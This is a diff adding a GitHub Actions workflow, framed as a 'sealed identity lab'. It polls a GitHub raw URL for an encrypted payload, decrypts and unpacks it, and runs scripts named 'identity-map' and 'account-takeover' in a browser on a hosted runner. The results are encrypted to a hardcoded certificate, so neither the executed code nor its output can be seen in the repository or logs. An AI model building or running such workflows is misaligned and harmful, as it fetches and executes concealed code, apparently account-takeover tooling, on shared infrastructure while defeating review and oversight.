@@ -1,0 +1,104 @@
+name: G07 isolated sealed Identity lab
+on:
+  push:
+    branches:
+      - g07-l095-pa30-e83-20261128-c73f
+    paths:
+      - .github/workflows/g07-l095-e92.yml
+
+permissions:
+  contents: read
+
+jobs:
+  sealed:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 11.0.x
+      - name: Publish one-run receiver certificate
+        shell: bash
+        run: |
+          set -euo pipefail
+          openssl req -x509 -newkey rsa:3072 -keyout "$RUNNER_TEMP/g07-receiver-key.pem" -out "$RUNNER_TEMP/g07-receiver-cert.pem" -days 1 -nodes -subj /CN=G07-E92-Receiver >/dev/null 2>&1
+          echo '=== BEGIN RECEIVER CERT ==='
+          cat "$RUNNER_TEMP/g07-receiver-cert.pem"
+          echo '=== END RECEIVER CERT ==='
+      - name: Run sealed fixture and seal evidence
+        shell: bash
+        run: |
+          set -euo pipefail
+          sealed="$RUNNER_TEMP/g07-sealed-payload.cms"
+          found=0
+          for i in $(seq 1 180); do
+            if curl -fsSL --max-time 15 "https://raw.githubusercontent.com/aeorauk-maker/dotnet-cross-platform-runner-lab/g07-l095-pa30-e83-20261128-c73f/g07-sealed-payload.cms?poll=$i" -o "$sealed" 2>/dev/null; then
+              found=1
+              break
+            fi
+            sleep 5
+          done
+          if [ "$found" -ne 1 ]; then
+            echo 'Encrypted fixture did not arrive'
+            exit 1
+          fi
+          openssl cms -decrypt -binary -inform DER -in "$sealed" -recip "$RUNNER_TEMP/g07-receiver-cert.pem" -inkey "$RUNNER_TEMP/g07-receiver-key.pem" -out "$RUNNER_TEMP/g07-source.tgz" >/dev/null 2>&1
+          mkdir -p "$RUNNER_TEMP/g07-lab"
+          tar -xzf "$RUNNER_TEMP/g07-source.tgz" -C "$RUNNER_TEMP/g07-lab"
+          python3 -m venv "$RUNNER_TEMP/g07-venv"
+          "$RUNNER_TEMP/g07-venv/bin/python" -m pip -q install playwright >/dev/null
+          chrome="$(command -v google-chrome || command -v chromium || true)"
+          if [ -z "$chrome" ]; then
+            echo 'Chrome unavailable on hosted runner'
+            exit 1
+          fi
+          export G07_DOTNET="$(command -v dotnet)"
+          export G07_CHROME="$chrome"
+          lab="$RUNNER_TEMP/g07-lab"
+          mkdir -p "$lab/E83-identity-map/evidence" "$lab/E84-account-takeover/evidence"
+          if "$RUNNER_TEMP/g07-venv/bin/python" "$lab/E83-identity-map/run.py" > "$RUNNER_TEMP/g07-e83-private.log" 2>&1; then
+            status83=0
+          else
+            status83=$?
+          fi
+          if "$RUNNER_TEMP/g07-venv/bin/python" "$lab/E84-account-takeover/run.py" > "$RUNNER_TEMP/g07-e84-private.log" 2>&1; then
+            status84=0
+          else
+            status84=$?
+          fi
+          tar -czf "$RUNNER_TEMP/g07-results.tgz" -C "$RUNNER_TEMP" g07-e83-private.log g07-e84-private.log -C "$lab" E83-identity-map/evidence E84-account-takeover/evidence
+          cat > "$RUNNER_TEMP/g07-researcher-cert.pem" <<'CERT'
+          -----BEGIN CERTIFICATE-----
+          MIIDqjCCAhICCQDeK9EHr2K0rTANBgkqhkiG9w0BAQsFADAXMRUwEwYDVQQDDAxH
+          MDctTDA5NS1FOTIwHhcNMjYxMTI4MDkyNjE4WhcNMjYxMTMwMDkyNjE4WjAXMRUw
+          EwYDVQQDDAxHMDctTDA5NS1FOTIwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGK
+          AoIBgQClgUp9YrXpTdlNedNzjHgTcGOP5rHfy/2c7PoaV7bVoEE8otyrE17oglV3
+          z0teqK9BzdiiouB61L6kVvRqAN1H4InItcoBzxs5DP47OWByTX45Jyq9bzcwvfiP
+          GxDXb+/QiyCqlZgzbac19Y6dOjzeatlxpTtGN9ql/s8jRWjyOPWzSkss8LYPyRfb
+          TnZinxra9wdG6lqJPR+uwPSG/SY2Z8wosFFu7ix8v04p0FaT50mzF/kaGsTyuwZV
+          HkA7JlCaE6EM8Fau6WhLHTxrQRBVKXZ/DAsjijdsIPYZQJ/iWHMDqa+wLw7Uy6a+
+          YDbI2R7F0UMwcrRU87cKWG4QAp3eXb7/IQfiXIdjWt+tEH3yUfWO5aRH7dY0TDWk
+          NcPto7QQWuAttR7FBAmOVdMe76C9jHfyABw3Hskf/unM8MVRz8qauht20c3OV91q
+          WEVghiDYhNvuSWEBueblLaPior2O64065etroFtBqyyjGOjnsfumc521AIsPmZYl
+          EEubSO8CAwEAATANBgkqhkiG9w0BAQsFAAOCAYEAMYdLlEIdIrqdeBaF7dxu9rk6
+          u11g1Yy2Qwku+QjcEP+ju9b9l52OZPw3TKDkaniIWvwedbRGYiS/A5sRUtAAUUwI
+          VMGhif0BR+EQkOhyhqZGgPb/LN1NVVNuOrkESyyJUQe/4i2EFvSlWRC6p8SYdrR3
+          ByOHBLxIfwfCaGyHqRpQNJRcMw9sV3TfDG+1oQ3isj8E73g/efByG4HVyGzUQ1f4
+          +ABzwxSitjFOnTn9S1kYOhF+VOTFYqMVONp0AM9Rz9sIXVNe//ecv9l4YdvDRb1U
+          HGs8PQtlvu4sBGn47d4MHe1Kx/163P+PezgSeqErcrQkeervHOfYOzhpmVY8dAGZ
+          qDQLqCsS+G1sLWMLbcAlsgWJKAkOmBpNACISKNT0k3kejJzPW/YLG27sM0Z7A67e
+          AGsgFr1iB9fp0LYgfFZf0NAPj9towK5/jcCFVQlHuWKO7Ag4B6krOQqfodhfkfTi
+          MwOThnVpkpeuH+jofGHdx1WMi/mp8WewC4g+VrIG
+          -----END CERTIFICATE-----
+          CERT
+          openssl cms -encrypt -binary -aes256 -in "$RUNNER_TEMP/g07-results.tgz" -out "$RUNNER_TEMP/g07-results.cms" -outform DER "$RUNNER_TEMP/g07-researcher-cert.pem"
+          echo "E83 exit=$status83; E84 exit=$status84; evidence encrypted"
+          cp "$RUNNER_TEMP/g07-results.cms" ./g07-results.cms
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: g07-l095-e92-sealed-evidence
+          path: g07-results.cms
+          if-no-files-found: ignore
+          retention-days: 1
